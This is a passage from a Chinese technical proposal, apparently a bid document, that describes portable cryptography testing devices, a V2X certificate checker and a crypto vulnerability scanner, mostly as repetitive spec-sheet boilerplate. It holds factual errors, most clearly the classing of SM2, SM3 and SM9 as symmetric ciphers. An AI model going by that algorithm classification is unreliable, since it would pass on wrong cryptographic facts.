评估效果和准确性。</p><ol><li>提供报告和建议</li></ol><p>根据评估结果，生成X.509数字证书检测报告，并提供相应的建议和推荐措施。报告包括评估的范围、方法、发现的安全问题和建议的解决方案。确保报告清晰明了，便于相关团队理解和采纳。</p><ol><li>持续监测和更新</li></ol><p>X.509数字证书检测是一个持续的过程。建议定期进行X.509数字证书检测，特别是在证书有重大更新或变更时。跟踪X.509证书的安全标准和最佳实践，及时更新评估策略和方法。</p><h4 id="网络传输密码检测仪"><a href="#网络传输密码检测仪" class="headerlink" title="网络传输密码检测仪"></a>网络传输密码检测仪</h4><h5 id="功能实施方案-25"><a href="#功能实施方案-25" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><p>检测仪信息如下：</p><p>品牌：国利</p><p>型号：GLNET001</p><p>数量：1套</p><p>指标参数信息如下：</p><ol><li>便携式设备,体积0.005立方米，重量1.7KG，该设备采用全触摸屏操作，不需要键盘，使用户可以轻松地通过手指操作完成各种任务。配备了miniHDMI接口，可以外接显示器，提供更大的显示屏幕和更高的清晰度，满足用户对视觉体验的要求。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/465fa7ff3b59a0779967fa0bdfc53343.png" alt="IMG_256"></p><ol><li>USB接口3个,网络接口2*10/100/1000M电口：配备了两个USB3.0接口，1个USB2.0接口，方便用户连接外部设备，如鼠标、键盘、打印机等。提供了两个10/100/1000M电口的网络接口，支持高速有线网络连接，确保稳定且快速的网络传输。</li><li>支持网络旁路方式接入被测系统，进行通信密码安全性检测：旁路接入被测系统的网络，对系统中的通信密码进行检测，确保其安全性。这可包括使用强加密算法和安全通信协议来保护数据传输的机密性和完整性，并确保身份验证过程的安全性。</li><li>支持网络透明桥接方式接入被测系统，进行通信密码安全性检测：支持在不影响系统正常运行的情况下，透明桥接接入被测系统网络，对通信密码的安全性进行检测和评估。透明桥接方式可以实现网络流量的监听和分析，以识别潜在的安全漏洞和密码弱点。</li><li>支持通过U盘导入pcap格式的网络报文，对其进行密码应用数据检测：将已捕获的网络报文通过U盘导入系统，并对其中的密码应用数据进行检测和分析。这包括对传输过程中使用的密码算法、密钥管理和身份验证机制进行评估，以确保其安全性和可靠性。</li><li>支持IPSECVPN、SSLVPN、TLCP、SSH、HTTPS、SSL/TLS的密码算法的识别与验证：具备IPSECVPN识别与验证能力，能够准确识别和验证IPSECVPN使用的密码算法，确保通信过程中的数据安全。具备SSLVPN、TLCP、SSH、HTTPS、SSL/TLS的识别与验证能力，同样能够识别和验证这些协议所使用的密码算法，确保各种通信方式的数据传输安全。检测并验证系统中使用的不同密码算法的安全性和可靠性，如DES、AES、RSA等。针对不同的通信协议和应用场景，可以选择合适的密码算法和密钥长度，并对其进行评估和验证，以确保其满足安全要求。通过对通信过程中的加密、解密、身份验证等环节进行分析和测试，可以发现潜在的安全漏洞和弱点，并及时提出修复建议。</li><li>支持100种密码算法的识别与检测，包括SM1/SM2/SM3/SM4/SM9、RSA/ECC/DES/3DES/AES/MD5/SHA等。全面支持国密算法SM1/SM2/SM3/SM4/SM9，确保符合国家密码标准。RSA、ECC、DES、3DES、AES：支持常见的对称和非对称加密算法RSA、ECC、DES、3DES、AES，满足各种加密需求。MD5、SHA：提供常用的哈希函数，MD5、SHA，用于数据完整性验证。通过这种方式，可以全面识别和检测系统中使用的各种密码算法，对其安全性和可靠性进行评估。针对不同的应用场景和安全要求，可以选择合适的密码算法和密钥长度，并对其进行验证和测试。</li><li>支持对身份认证相关数据进行安全性测试。这包括识别和验证身份认证阶段使用的密码算法，并按照相关国密标准对识别的密码算法进行安全性测试。准确检测和验证身份认证过程中使用的密码算法，采用识别和验证身份认证阶段的密码算法，确保身份认证的安全性。依据国密标准，按照相关国密标准进行安全性测试，对识别的密码算法进行严格的安全性测试，确保其满足标准要求。</li><li>支持密码应用的密码强度检测分析，包括素性检测、低指数攻击检测、随机数因子检测、不动点检测等。密码强度检测分析是评估密码应用安全性的关键过程，它涵盖了素性检测以确认密钥使用的大数是否真的是素数，这对于像RSA这样的算法至关重要。同时，低指数攻击检测旨在识别那些可能因使用低加密指数而容易受到特定类型攻击的弱点。随机数因子检测则确保用于生成密钥的随机数不包含可预测的因子，从而增强了密钥的抗攻击能力。不动点检测关注的是这些检测共同构成了对密码学系统进行全面安全评估的基础，帮助识别和修补潜在的安全漏洞。</li><li>支持密钥交换安全性测试。可以识别和验证密钥交换阶段使用的密码算法，并且可以按照相关国密标准进行对识别的密码算法进行安全性测试。密钥交换安全性测试的系统能够有效识别和验证密钥交换阶段所用的密码算法，并确保这些算法按照相关的国密标准执行安全性测试，这包括检测算法实现的正确性、抗攻击能力以及密钥的随机性和熵值。通过模拟攻击、分析密钥生成和管理过程，以及评估协议的实现细节，该测试确保密钥交换过程的整体安全性符合预定的密级要求，从而保护通信双方免受中间人攻击和其他威胁；</li><li>支持按照相关国密标准进行随机数测试。这包括支持GM/T 0005-2021《随机性检测规范》中全部15项随机性检测方法，用于评估随机数生成器的安全性和可靠性，确保随机数生成的随机性和不可预测性，通过对随机数的质量和统计特征进行分析和测试，可以发现可能存在的弱点和漏洞，并提出相应的修复建议。</li><li>支持对数字证书进行安全性测试及校验。这包括对数字证书的有效性、完整性和合法性进行检验，以确保其具有良好的安全性。通过对数字证书的各个组成部分进行分析和验证，如签名算法、公钥、有效期等，可以发现可能存在的安全漏洞和风险，并提出相应的修复建议。</li><li>支持电子签章安全性测试。这包括对电子签章的完整性、真实性和可信度进行检验，以确保其具有良好的安全性。通过对电子签章的数字证书、签名算法、时间戳等进行分析和验证，可以发现可能存在的安全漏洞和风险，并提出相应的修复建议。</li><li>支持数字信封数据的安全性测试。数字信封是一种用于保护数据隐私和完整性的加密技术，它将原始数据用对称或非对称加密算法进行加密，并附加一些校验信息，以确保数据在传输和存储过程中不受未授权的访问和篡改。通过对数字信封的各个组成部分进行分析和测试，可以发现可能存在的安全漏洞和风险，并提出相应的修复建议。</li></ol><h5 id="技术实现内容-23"><a href="#技术实现内容-23" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><h6 id="网络传输密码检测仪方案设计技术实现内容"><a href="#网络传输密码检测仪方案设计技术实现内容" class="headerlink" title="网络传输密码检测仪方案设计技术实现内容"></a>网络传输密码检测仪方案设计技术实现内容</h6><ol><li>确定评估目标</li></ol><p>明确网络传输密码检测仪的目标和范围。确定要评估的密码算法和协议，例如TLS/SSL、IPsec等。了解密码算法和协议的安全性要求和应用场景，以确定评估的重点和覆盖范围。</p><ol><li>收集密码算法和协议规范</li></ol><p>收集密码算法和协议的规范和标准，例如TLS/SSL的RFC文档。深入了解算法和协议的工作原理、加密流程、密钥管理等关键方面。这些文档将成为评估和测试的重要依据。</p><ol><li>设计评估策略</li></ol><p>制定网络传输密码检测仪的评估策略和计划。确定评估的方法和技术，例如流量分析、协议解析、加密弱点检测等。考虑使用公开可用的密码分析工具、流量捕获工具或自研工具来辅助评估。</p><ol><li>确定评估场景</li></ol><p>基于密码算法和协议的规范和安全要求，确定网络传输密码检测仪的关键场景和使用情境。考虑不同的网络传输场景、协议版本、加密参数等。确保评估场景具有多样性和代表性，能够覆盖密码算法和协议的各个安全方面。</p><ol><li>执行密码检测</li></ol><p>根据评估策略和场景，执行网络传输密码检测。使用合适的工具和技术进行评估，对传输的加密流量进行分析、解密、检查弱点等活动。记录评估结果、问题和建议。</p><ol><li>分析和改进</li></ol><p>分析密码检测的结果和问题，识别潜在的安全漏洞和改进点。根据评估结果进行调整和改进密码算法和协议的实现和配置。持续改进评估策略和方法，以提高评估效果和准确性。</p><ol><li>提供报告和建议</li></ol><p>根据评估结果，生成密码检测报告，并提供相应的建议和推荐措施。报告包括评估的范围、方法、发现的安全问题和建议的解决方案。确保报告清晰明了，便于相关团队理解和采纳。</p><ol><li>持续监测和更新</li></ol><p>密码检测是一个持续的过程。建议定期进行密码检测，特别是在密码算法和协议有重大更新或变更时。跟踪密码算法和协议的安全标准和最佳实践，及时更新评估策略和方法。</p><h4 id="智能网联V2X密码应用安全检测工具"><a href="#智能网联V2X密码应用安全检测工具" class="headerlink" title="智能网联V2X密码应用安全检测工具"></a>智能网联V2X密码应用安全检测工具</h4><h5 id="功能实施方案-26"><a href="#功能实施方案-26" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><p>产品信息如下：</p><p>品牌：国利</p><p>型号：GLv2x022</p><p>数量：1套</p><p>指标参数信息如下：</p><ol><li>便携式设备,体积0.005立方米，重量1.7KG，该设备采用全触摸屏操作，不需要键盘，使用户可以轻松地通过手指操作完成各种任务。配备了miniHDMI接口，可以外接显示器，提供更大的显示屏幕和更高的清晰度，满足用户对视觉体验的要求。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/d023a56802d1f092e2267d2b197f7d07.png"></p><ol><li>USB接口3个,网络接口2*10/100/1000M电口：配备了两个USB3.0接口，1个USB2.0接口，方便用户连接外部设备，如鼠标、键盘、打印机等。提供了两个10/100/1000M电口的网络接口，支持高速有线网络连接，确保稳定且快速的网络传输。</li><li>支持按照相关标准对车联网V2X证书进行检测。车联网V2X证书是一种用于保护车辆通信安全的数字证书，它通过数字签名算法对车辆身份和通信数据进行认证和加密，以确保车辆之间的通信安全和可信度。证书检测，包括对证书格式、数字签名算法、密钥管理等进行验证。同时，还可以按照相关标准进行测试，如IEEE 1609.2、CAV-DSP等，以确保车联网V2X证书满足安全和可信的要求。</li><li>支持对国密算法与国际标准密码算法的识别与检测，对于国密算法与国际标准密码算法的识别与检测，密码检测测试工具将提供全面的支持。国密算法是国家密码管理局发布的一系列密码算法标准，包括SM1、SM2、SM3、SM4、SM9等，这些算法在数据加密、数字签名、证书生成等方面具有高效和安全的特点。国际标准密码算法则是全球范围内广泛应用的算法标准，如RSA、ECC、DES、3DES、AES等。为了满足用户对不同密码算法的需求，工具将具备强大的算法识别能力。它可以自动识别和分类各种国密算法和国际标准密码算法，并根据用户的需求进行相应的测试和分析。无论是国密算法还是国际标准密码算法，工具都能提供准确的检测结果和详细的性能分析，帮助用户了解算法的安全性能和潜在风险。。</li><li>支持对车联网注册证书进行全面的安全性分析。注册证书作为车联网设备接入网络的身份凭证，其安全性至关重要。本工具通过分析证书的签名、有效期、以及密钥的强度等关键安全特征，帮助识别可能的安全风险，确保注册证书的可靠性和防篡改性；</li><li>工具针对车联网假名证书提供专门的安全性分析功能。假名证书在车联网中用于保护用户隐私，通过定期更换假名来避免用户身份被追踪。工具通过分析假名证书的更新频率、加密算法和协议实施情况等，确保假名证书的实施机制能有效保护用户隐私，同时符合行业安全标准；</li><li>支持对车联网应用证书进行安全性分析。应用证书用于验证车联网应用的真实性和完整性，是保障车联网应用交互安全的关键。本工具通过分析应用证书的授权范围、密钥管理和使用策略等，帮助确保应用证书能够有效防止恶意软件的侵入和数据泄露；</li><li>支持对车联网安全消息的进行安全性分析：随着车联网技术的迅猛发展，车辆之间及车辆与基础设施之间的通信安全显得尤为重要。该工具能够对车联网中传输的安全消息进行深入的安全性分析，确保信息传递过程中的数据完整性和隐私保护；</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/48d359695dfdaa2e97fec921d5610f6a.png"></p><ol><li>工具集成了先进的随机数测试功能，特别支持符合国家密码管理局发布的国密标准GM/T 0005-2021《随机性检测规范》。该规范详尽地列出了15项随机性检测方法，本工具支持全部15项随机性检测方法，和4项NIST标准的随机性检测方法，合计19项，旨在确保随机数生成器（RNG）输出的数字序列达到真正随机的要求，这对于加密系统的安全性至关重要。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/40e3d870958d3845658d2b5113e31418.png"></p><h5 id="技术实现内容-24"><a href="#技术实现内容-24" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><h6 id="智能网联V2X密码应用安全检测工具方案设计"><a href="#智能网联V2X密码应用安全检测工具方案设计" class="headerlink" title="智能网联V2X密码应用安全检测工具方案设计"></a>智能网联V2X密码应用安全检测工具方案设计</h6><ol><li>确定评估目标</li></ol><p>明确智能网联V2X密码应用安全检测工具的目标和范围。确定要评估的密码应用，例如V2X通信中使用的加密算法和协议。了解密码应用的安全性要求和应用场景，以确定评估的重点和覆盖范围。</p><ol><li>收集密码应用规范和标准：收集密码应用的规范和标准，例如IEEE 1609.2标准中定义的V2X通信安全机制。深入了解密码应用的工作原理、加密流程、密钥管理等关键方面。这些文档将成为评估和测试的重要依据。</li><li>设计评估策略：制定智能网联V2X密码应用安全检测工具的评估策略和计划。确定评估的方法和技术，例如协议解析、加密算法分析、密钥管理检查等。考虑使用公开可用的密码分析工具、协议分析工具或自研工具来辅助评估。</li></ol><p>该工具采用便携式设计，体积仅有0.005立方米，重量2KG，全触摸屏操作。覆盖GM/T 0005-2021《随机性检测规范》中全部15项随机性检测方法。同时配置了外接显示miniHDMI接口，USB接口及网口。可按照相关标准对车联网V2X证书进行检测，实现对国密算法与国际标准密码算法的识别与检测，满足车联网证书的注册信息、仿冒及应用证书的检测。</p><ol><li>确定评估场景：基于密码应用的规范和安全要求，确定智能网联V2X密码应用安全检测工具的关键场景和使用情境。考虑不同的V2X通信场景、协议版本、加密参数等。确保评估场景具有多样性和代表性，能够覆盖密码应用的各个安全方面。</li><li>执行密码应用安全检测：根据评估策略和场景，执行智能网联V2X密码应用安全检测。使用合适的工具和技术进行评估，对V2X通信中的密码应用进行解析、分析、检查安全性等活动。记录评估结果、问题和建议。</li></ol><p>满足身份认证阶段网络通信数据的安全性测试。可以识别和验证身份认证信息及身份认证阶段所使用的密码算法，并依据相关国家标准判断其身份认证过程设计是否有效，同时可按照相关国密标准进行对识别到的身份认证信息与密码算法进行安全性测试。</p><p>满足密钥交换阶段网络通信数据的安全性测试。可以识别和验证密钥交换阶段所使用的密码算法，判断其密钥安全性能，并且可以按照相关国密标准进行对识别的密码算法进行安全性测试。</p><p>满足密码应用的强度分析，方法均依据相关国家标准进行设计，包括素性测试（费马素性测试、Miller-Rabin素性测试）、低指数攻击测试（低加密指数攻击测试、低加密指数广播攻击测试、低解密指数攻击测试）、随机数因子测试、不动点测试、依赖性测试、频率测试、动向测试等。</p><ol><li>分析和改进：分析密码应用安全检测的结果和问题，识别潜在的安全漏洞和改进点。根据评估结果进行调整和改进密码应用的实现和配置。持续改进评估策略和方法，以提高评估效果和准确性。</li><li>提供报告和建议：根据评估结果，生成密码应用安全检测报告，并提供相应的建议和推荐措施。报告包括评估的范围、方法、发现的安全问题和建议的解决方案。确保报告清晰明了，便于相关团队理解和采纳。</li><li>持续监测和更新：密码应用安全检测是一个持续的过程。建议定期进行密码应用安全检测，特别是在密码应用有重大更新或变更时。跟踪密码应用的安全标准和最佳实践，及时更新评估策略和方法。</li></ol><h4 id="密码应用漏洞扫描系统"><a href="#密码应用漏洞扫描系统" class="headerlink" title="密码应用漏洞扫描系统"></a>密码应用漏洞扫描系统</h4><h5 id="功能实施方案-27"><a href="#功能实施方案-27" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><p>产品信息如下：</p><p>品牌：国利</p><p>型号：GLSCNN12</p><p>数量：1套</p><p>指标参数信息如下：</p><ol><li>便携式设备,体积0.005立方米，重量1.7KG，该设备采用全触摸屏操作，不需要键盘，使用户可以轻松地通过手指操作完成各种任务。配备了miniHDMI接口，可以外接显示器，提供更大的显示屏幕和更高的清晰度，满足用户对视觉体验的要求。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c9c20fe678034e819d2591da5af239c0.png"></p><ol><li>USB接口3个,网络接口2*10/100/1000M电口：配备了两个USB3.0接口，1个USB2.0接口，方便用户连接外部设备，如鼠标、键盘、打印机等。提供了两个10/100/1000M电口的网络接口，支持高速有线网络连接，确保稳定且快速的网络传输。</li><li>支持网络接入，主动扫描网络上加密应用系统：能够支持网络接入与主动扫描，密码检测测试工具将支持网络接入，能够主动扫描网络上加密的应用系统，发现并识别正在使用的加密协议和算法。通过实时监测网络流量和活动，工具能够快速定位和识别加密通信，为进一步的检测和分析提供基础数据。</li><li>支持100种密码算法识别与检测，包含：SM1/SM2/SM3/SM4/SM9、RSA/ECC/DES/3DES/AES/MD5/SHA。100种算法如下：</li></ol><table><thead><tr><th><strong>序号</strong></th><th><strong>算法名称</strong></th><th><strong>序号</strong></th><th><strong>算法名称</strong></th></tr></thead><tbody><tr><td>1</td><td>SM1</td><td>51</td><td>ChaCha20</td></tr><tr><td>2</td><td>SM2</td><td>52</td><td>Poly1305</td></tr><tr><td>3</td><td>SM3</td><td>53</td><td>Curve25519</td></tr><tr><td>4</td><td>SM4</td><td>54</td><td>Curve448</td></tr><tr><td>5</td><td>SM9</td><td>55</td><td>Groestl (used in Groestlcoin)</td></tr><tr><td>6</td><td>RSA</td><td>56</td><td>JH</td></tr><tr><td>7</td><td>ECC (Elliptic Curve Cryptography)</td><td>57</td><td>Skein</td></tr><tr><td>8</td><td>DES (Data Encryption Standard)</td><td>58</td><td>Keccak (basis for SHA-3)</td></tr><tr><td>9</td><td>3DES (Triple Data Encryption Algorithm)</td><td>59</td><td>LOKI97</td></tr><tr><td>10</td><td>AES (Advanced Encryption Standard)</td><td>60</td><td>MAGENTA</td></tr><tr><td>11</td><td>MD5 (Message Digest Algorithm 5)</td><td>61</td><td>MARS (IBM’s candidate for AES)</td></tr><tr><td>12</td><td>SHA-1 (Secure Hash Algorithm 1)</td><td>62</td><td>NOEKEON</td></tr><tr><td>13</td><td>SHA-256</td><td>63</td><td>SEED (a block cipher developed by KISA)</td></tr><tr><td>14</td><td>SHA-512</td><td>64</td><td>SHACAL-2</td></tr><tr><td>15</td><td>SHA-3</td><td>65</td><td>SOSEMANUK</td></tr><tr><td>16</td><td>Blowfish</td><td>66</td><td>SQUARE</td></tr><tr><td>17</td><td>Twofish</td><td>67</td><td>UMAC (Universal Message Authentication Code)</td></tr><tr><td>18</td><td>Serpent</td><td>68</td><td>VMAC (Vector Message Authentication Code)</td></tr><tr><td>19</td><td>RC4 (Rivest Cipher 4)</td><td>69</td><td>XMACC</td></tr><tr><td>20</td><td>RC5</td><td>70</td><td>TTM (Two to Mango)</td></tr><tr><td>21</td><td>RC6</td><td>71</td><td>HC-128</td></tr><tr><td>22</td><td>IDEA (International Data Encryption Algorithm)</td><td>72</td><td>HC-256</td></tr><tr><td>23</td><td>CAST5</td><td>73</td><td>Panama</td></tr><tr><td>24</td><td>CAST6</td><td>74</td><td>Rabbit</td></tr><tr><td>25</td><td>Camellia</td><td>75</td><td>Sosemanuk</td></tr><tr><td>26</td><td>SEED</td><td>76</td><td>Anubis</td></tr><tr><td>27</td><td>Skipjack</td><td>77</td><td>Khazad</td></tr><tr><td>28</td><td>TEA (Tiny Encryption Algorithm)</td><td>78</td><td>Kuznyechik (GOST R 34.12-2015)</td></tr><tr><td>29</td><td>XTEA (eXtended Tiny Encryption Algorithm)</td><td>79</td><td>Streebog (GOST R 34.11-2012)</td></tr><tr><td>30</td><td>XXTEA (Corrected Block Tiny Encryption Algorithm)</td><td>80</td><td>FROG</td></tr><tr><td>31</td><td>Whirlpool</td><td>81</td><td>HIGHT</td></tr><tr><td>32</td><td>GOST (ГОСТ Р 34.11-94)</td><td>82</td><td>LEA</td></tr><tr><td>33</td><td>Tiger</td><td>83</td><td>SHARK</td></tr><tr><td>34</td><td>RIPEMD-160</td><td>84</td><td>Spectral Hash</td></tr><tr><td>35</td><td>RIPEMD-320</td><td>85</td><td>Tangle</td></tr><tr><td>36</td><td>MISTY1</td><td>86</td><td>Photon</td></tr><tr><td>37</td><td>MISTY2</td><td>87</td><td>Quark</td></tr><tr><td>38</td><td>KASUMI</td><td>88</td><td>SipHash</td></tr><tr><td>39</td><td>ARIA</td><td>89</td><td>Blake</td></tr><tr><td>40</td><td>CLEFIA</td><td>90</td><td>Blake2</td></tr><tr><td>41</td><td>HMAC (Hash-based Message Authentication Code)</td><td>91</td><td>Grøstl</td></tr><tr><td>42</td><td>PBKDF2 (Password-Based Key DerivationFunction 2)</td><td>92</td><td>JH (one of the five final SHA-3 candidates)</td></tr><tr><td>43</td><td>Argon2</td><td>93</td><td>Cramer-Shoup cryptosystem</td></tr><tr><td>44</td><td>Scrypt</td><td>94</td><td>McEliece cryptosystem</td></tr><tr><td>45</td><td>bcrypt</td><td>95</td><td>NewHope</td></tr><tr><td>46</td><td>ElGamal</td><td>96</td><td>NTRU</td></tr><tr><td>47</td><td>DSA (Digital Signature Algorithm)</td><td>97</td><td>OTR (Off-the-Record Messaging)</td></tr><tr><td>48</td><td>ECDSA (Elliptic Curve Digital Signature Algorithm)</td><td>98</td><td>PGP (Pretty Good Privacy)</td></tr><tr><td>49</td><td>EdDSA (Edwards-curve Digital Signature Algorithm)</td><td>99</td><td>Signal Protocol (used in Signal messaging app)</td></tr><tr><td>50</td><td>Salsa20</td><td>100</td><td>ZRTP (Zimmermann Real-time Transport Protocol)</td></tr></tbody></table><ol><li>支持对密码应用的弱算法进行检测分析：这些算法可能因为密钥长度不足或算法本身的弱点容易受到攻击。通过检测这些弱点，工具可以帮助开发者及时发现并替换那些可能危害系统安全的算法。</li><li>支持对密码应用的弱算法进行检测分析：支持密码弱算法检测分析，在密码应用中，有时会使用一些不够安全的弱算法。这些算法可能存在已知的安全漏洞或性能问题，增加了被攻击的风险。为了提高密码应用的安全性，密码检测测试工具将支持对弱算法进行检测分析。通过深入分析密码算法的实现和应用场景，工具能够快速识别和分类各种弱算法。一旦检测到弱算法的使用，工具会立即发出警告并提供详细的分析报告。报告将包括对弱算法的弱点描述、潜在风险和推荐的安全措施。除了检测弱算法，工具还会提供修复建议和替代方案。用户可以根据工具的建议进行相应的调整和改进，以增强密码应用的安全性。通过弱算法的检测分析，密码检测测试工具能够帮助用户及时发现和处理潜在的安全风险，确保密码应用的安全性和可靠性。</li><li>支持检测分析密码应用使用的密码算法、密码套件：对于密码算法和密码套件的使用情况，工具提供了深入的检测和分析支持。这包括对算法的安全性、实现方式以及与其他系统组件的兼容性进行评估，确保密码应用的每一个环节都是安全的</li><li>支持对密码应用中使用的全部算法曲线参数进行检测分析，对于密码应用中使用的各种算法曲线参数，工具也能够进行检测和分析。通过对参数的有效性、准确性和安全性进行评估，工具能够确保密码应用的正确性和安全性</li><li>支持密码应用密码前向安全性检查：前向安全性是一种确保加密通信不被未来攻击者解密的方法。工具将支持前向安全性检查，通过验证加密算法的实现是否符合前向安全性的要求，来提高密码应用的安全性。</li><li>支持对密码应用整体安全性进行量化评估：为了全面评估密码应用的安全性水平，工具将支持对密码应用的整体安全性进行量化评估。通过综合分析密码算法、套件、参数以及漏洞等多个方面，工具能够提供一个量化的安全评分，帮助用户直观地了解其密码应用的安全状况，通过这一功能，用户可以得到一个关于密码应用安全性的量化指标，帮助他们更直观地理解安全水平。</li><li>支持密码应用的密码强度检测分析，包括素性检测、低指数攻击检测、随机数因子检测、不动点检测等。工具还将支持对密码应用的密码强度进行深入的检测和分析。包括素性检测、低指数攻击检测、随机数因子检测以及不动点检测等多种方法，以确保密码应用的安全性和可靠性。密码强度检测分析是评估密码应用安全性的关键过程，它涵盖了素性检测以确认密钥使用的大数是否真的是素数，这对于像RSA这样的算法至关重要。同时，低指数攻击检测旨在识别那些可能因使用低加密指数而容易受到特定类型攻击的弱点。随机数因子检测则确保用于生成密钥的随机数不包含可预测的因子，从而增强了密钥的抗攻击能力。不动点检测关注的是加密算法中可能存在的不动点，即加密后数据保持不变的情况，这可能会暴露出算法的弱点。</li></ol><h5 id="技术实现内容-25"><a href="#技术实现内容-25" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><h6 id="密码应用漏洞扫描系方案设计"><a href="#密码应用漏洞扫描系方案设计" class="headerlink" title="密码应用漏洞扫描系方案设计"></a>密码应用漏洞扫描系方案设计</h6><ol><li><p>设备概述</p><p>设备类型：便携式设备；</p><p>尺寸和重量：体积为0.005立方米，重量为1.7KG；</p><p>操作方式：全触摸屏操作，无需键盘；</p><p>外接接口：2个USB接口，2个10/100/1000M以太网口，1个miniHDMI显示接口。</p></li><li><p>网络扫描功能</p></li></ol><p>支持网络接入：能够通过有线网络接口主动扫描网络上的加密应用系统</p><ol><li><p>支持的密码算法识别与检测</p><p>支持100种密码算法的识别与检测，如SM1/SM2/SM3/SM4/SM9、RSA/ECC/DES/3DES/AES/MD5/SHA。其中：</p><p>对称加密算法：SM1、SM2、SM3、SM4、SM9、DES、3DES、AES</p><p>非对称加密算法：RSA、ECC</p><p>散列算法：MD5、SHA</p></li><li><p>弱算法检测分析</p></li></ol><p>支持对密码应用中使用的弱算法进行检测分析，识别容易受到攻击的算法，并提供相应的警告或建议。</p><ol><li>密码漏洞检测分析</li></ol><p>支持对密码应用中的密码漏洞进行检测分析，识别可能存在的漏洞，并提供相应的警告或建议。</p><ol><li>密码算法和密码套件检测分析</li></ol><p>支持对密码应用使用的密码算法和密码套件进行检测分析，确保其符合安全标准和最佳实践。</p><ol><li>算法曲线参数检测分析</li></ol><p>支持对密码应用中使用的算法曲线参数进行检测分析，确保其参数设置符合安全要求。</p><ol><li>密码前向安全性检查</li></ol><p>支持对密码应用的密码前向安全性进行检查，评估密码的保密性和完整性。</p><ol><li>安全性量化评估</li></ol><p>支持对密码应用的整体安全性进行量化评估，通过评分或指标来衡量密码应用的安全性水平。</p><ol><li>密码强度检测分析</li></ol><p>支持对密码应用的密码强度进行检测分析，包括素性检测、低指数攻击检测、随机数因子检测、不动点检测等。</p><h1 id="智能汽车网络靶场工具库-V2X安全检测平台"><a href="#智能汽车网络靶场工具库-V2X安全检测平台" class="headerlink" title="智能汽车网络靶场工具库-V2X安全检测平台"></a>智能汽车网络靶场工具库-V2X安全检测平台</h1><h2 id="技术路线-5"><a href="#技术路线-5" class="headerlink" title="技术路线"></a>技术路线</h2><h3 id="V2X安全检测平台"><a href="#V2X安全检测平台" class="headerlink" title="V2X安全检测平台"></a>V2X安全检测平台</h3><h4 id="功能实施方案-28"><a href="#功能实施方案-28" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>提供的V2X安全检测平台包含测试用例库、测试控制系统、测试环境基础平台、测试模拟系统、测试系统管理模块、测试系统执行模块、测试系统报告生成模块的功能。</p><p>测试用例库，用于存放和管理各种测试用例，支持测试用例的录入、编辑、删除和导出等功能。</p><p>测试控制系统，提供一个集中的测试控制，允许用户通过简单的操作来控制和执行测试。</p><p>测试环境基础平台，提供一个稳定、可靠的测试环境基础平台，用于支撑V2X安全检测的各种测试。</p><p>测试模拟系统，构建一个用于模拟仿真测试的测试模拟系统。</p><p>测试系统管理模块，提供一个用于管理测试系统的模块，包括用户管理、权限管理、日志管理等。</p><p>测试系统执行模块，负责执行测试系统中的各项测试任务，并记录测试结果。</p><p>测试系统报告生成模块，负责执行测试系统中的各项测试任务，并记录测试结果。</p><h4 id="测试控制系统"><a href="#测试控制系统" class="headerlink" title="测试控制系统"></a>测试控制系统</h4><h5 id="工程向导"><a href="#工程向导" class="headerlink" title="工程向导"></a>工程向导</h5><h6 id="功能实施方案-29"><a href="#功能实施方案-29" class="headerlink" title="功能实施方案"></a>功能实施方案</h6><p>提供的V2X安全检测平台能够提供工程向导功能，支持用户快速创建新的测试工程，并自动进行资源的管理和组织。当用户通过工程向导创建新的工程项目时，系统应自动解压预置的资源模板包，并生成对应的工程项目目录，以便于用户进行资源的查找和使用。</p><p>提供的V2X安全检测平台能够提供完整的C++开发环境，支持开发者使用C++语言进行被测系统适配器和编码解码器的开发工作。通过使用C++语言，开发者可以更加高效地进行底层接口的对接和数据处理，从而实现更加精准和可靠的测试结果。</p><h6 id="技术实现内容-26"><a href="#技术实现内容-26" class="headerlink" title="技术实现内容"></a>技术实现内容</h6><p>工程向导支持新建工程，组织和管理资源的功能。当通过工程向导创建新的工程项目时，系统自动解压资源模板包，并且生成工程项目目录。支持工程项目中使用C++语言开发相应的被测系统适配器和编码解码器。</p><p>工程向导是一个为用户提供创建和管理工程项目的强大工具，它简化了项目的初始设置和资源管理过程。通过工程向导，用户可以轻松启动新的工程项目，无需手动创建和配置复杂的项目结构。当用户启动工程向导并选择新建工程项目时，工程向导会引导用户通过几个简单的步骤，如输入项目名称、选择项目类型和配置基本参数。</p><p>一旦这些初步信息被确认，系统将自动执行资源模板包的解压操作。这个资源模板包含了所有必要的文件和目录结构，它们是预先设计好的，符合特定类型的工程项目标准。这些模板可能包括基础的源代码文件、项目配置文件、库文件、文档模板以及其他必要的资源。这一自动化步骤大大节省了用户的时间，避免了在项目建立过程中可能出现的错误。</p><p>一旦资源模板包被解压，工程项目目录将被生成。这个目录结构是精心组织的，以确保项目的各个组成部分都能被适当地分类和存取。这包括源代码目录、头文件目录、资源文件目录、构建脚本目录等。这样的组织使得项目易于管理和维护，同时也便于团队协作和版本控制。</p><p>此外，工程向导还支持使用C++语言开发的工程项目，这对于需要高性能和系统级编程的工程尤为关键。用户可以在工程项目中开发被测系统适配器和编码解码器，这些是软件测试和系统集成中不可或缺的组件。被测系统适配器允许工程项目与外部系统或硬件接口，而编码解码器则负责处理数据的编码和解码工作，确保数据的正确传输和解释。</p><p>通过工程向导，开发者不仅能够快速搭建起工程项目的框架，还能确保项目结构的一致性和标准化。这样的工具不仅提高了开发效率，还减少了在项目初期可能发生的配置错误，为后续的开发工作奠定了坚实的基础。</p><h5 id="核心编辑器"><a href="#核心编辑器" class="headerlink" title="核心编辑器"></a>核心编辑器</h5><h6 id="功能实施方案-30"><a href="#功能实施方案-30" 